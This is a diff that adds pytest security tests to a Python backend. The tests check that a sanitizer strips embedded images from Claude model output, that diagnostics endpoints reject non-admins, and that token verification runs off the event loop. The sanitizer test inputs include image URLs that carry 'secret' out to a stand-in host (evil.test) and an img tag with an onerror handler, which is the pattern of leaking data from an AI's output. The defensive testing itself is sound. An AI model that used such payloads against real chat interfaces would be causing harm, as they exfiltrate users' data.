@@ -183,3 +183,49 @@ def test_jwt_forgeries_rejected(monkeypatch, variant):
         token = (head + b"." + body + b"." + sig).decode()
     with pytest.raises(Exception):
         auth_module._verify_clerk_token(token)
+
+
+# ── F3 server side / F7 ───────────────────────────────────────────────────────
+
+@pytest.mark.parametrize("raw,expected", [
+    ("see ![chart](https://evil.test/c.png?q=secret) here", "see chart here"),
+    ("![](https://evil.test/p.gif)", ""),
+    ("x ![a][r] y\n\n[r]: https://evil.test/z", "x a y\n\n[r]: https://evil.test/z"),
+    ('hi <img src="https://evil.test/a.png" onerror="x()"> there', "hi  there"),
+    ("a [link](https://ok.test) stays", "a [link](https://ok.test) stays"),
+])
+def test_f3_model_output_loses_embedded_images(raw, expected):
+    from backend import claude
+
+    assert claude._sanitize_model_output(raw) == expected
+
+
+@pytest.mark.parametrize("url", [
+    "/api/stack/health", "/api/health", "/api/devtools/reliability", "/api/devtools/rls-audit",
+])
+def test_f7_diagnostics_need_the_operator(test_client, monkeypatch, url):
+    monkeypatch.setenv("ADMIN_USER_IDS", "user_admin")
+    _as_user(monkeypatch, "user_someone_else")
+    assert test_client.get(url, headers=HEADERS).status_code == 403
+
+
+@pytest.mark.asyncio
+async def test_f5_bearer_verification_runs_off_the_event_loop(fastapi_client, monkeypatch):
+    import threading
+
+    from backend import rate_limit as rate_limit_mod
+
+    loop_thread = threading.get_ident()
+    seen = []
+
+    def resolve(authorization):
+        seen.append(threading.get_ident())
+        return "user_1"
+
+    monkeypatch.setattr(asgi, "extract_user_id_from_bearer_value", resolve)
+    monkeypatch.setattr(rate_limit_mod, "extract_user_id_from_bearer_value", resolve)
+    await fastapi_client.post(
+        "/ask", json={"question": ""},
+        headers={"Authorization": "Bearer fake", "X-Vercel-Forwarded-For": "203.0.113.78"})
+    assert seen, "the verifier was never called"
+    assert all(t != loop_thread for t in seen)
